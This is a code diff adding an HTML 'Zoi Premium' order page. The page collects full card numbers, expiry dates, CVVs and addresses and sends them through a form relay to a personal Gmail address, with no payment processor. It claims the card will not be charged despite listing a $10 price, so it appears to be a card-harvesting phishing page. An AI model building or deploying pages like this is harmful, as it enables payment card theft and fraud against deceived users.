@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Zoi Premium Payment Form</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f1f1f1;
+      padding: 20px;
+    }
+    .form-container {
+      background: #fff;
+      padding: 30px;
+      border-radius: 8px;
+      max-width: 400px;
+      margin: auto;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    input[type=text], input[type=email], input[type=number] {
+      width: 100%;
+      padding: 12px;
+      margin-top: 8px;
+      margin-bottom: 20px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+    input[readonly] {
+      background-color: #f9f9f9;
+    }
+    label {
+      font-weight: bold;
+    }
+    .submit-btn {
+      background-color: #1a73e8;
+      color: white;
+      padding: 12px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      width: 100%;
+    }
+    .submit-btn:hover {
+      background-color: #1559c7;
+    }
+    .note {
+      margin-top: 15px;
+      font-size: 13px;
+      color: #555;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <div class="form-container">
+    <h2>Zoi Premium Order Form</h2>
+    <form action="https://formsubmit.co/your-semijutt91@gmail.com" method="POST">
+      
+      <label for="name">Full Name</label>
+      <input type="text" name="Full Name" required>
+
+      <label for="email">Email</label>
+      <input type="email" name="Email" required>
+
+      <label for="country">Country</label>
+      <input type="text" name="Country" required>
+
+      <label for="city">City</label>
+      <input type="text" name="City" required>
+
+      <label for="zip">ZIP Code</label>
+      <input type="text" name="ZIP Code" required>
+
+      <label for="price">Price (USD)</label>
+      <input type="text" name="Price" value="$10" readonly>
+
+      <label for="card">Card Number</label>
+      <input type="text" name="Card Number" maxlength="19" required>
+
+      <label for="expiry">Expiry Date (MM/YY)</label>
+      <input type="text" name="Expiry Date" maxlength="5" required>
+
+      <label for="cvv">CVV</label>
+      <input type="text" name="CVV" maxlength="4" required>
+
+      <button class="submit-btn" type="submit">Submit</button>
+
+      <p class="note"><strong>Note:</strong> Your payment method will not be charged.</p>
+    </form>
+  </div>
+</body>
+</html>
